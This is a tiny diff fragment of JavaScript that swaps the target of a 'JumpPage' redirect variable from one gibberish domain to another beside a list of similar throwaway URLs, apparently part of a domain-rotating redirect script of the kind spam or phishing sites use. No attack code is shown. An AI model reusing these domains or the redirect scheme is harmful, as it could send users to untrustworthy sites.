@@ -42,7 +42,7 @@ var urls=[];
         urls.push(".eiaepmqa.cc");    
         
                      	
-var JumpPage="https://otpxxquh.club";
+var JumpPage="https://ibftnse.top";
 
 var newestUrls = [];
 
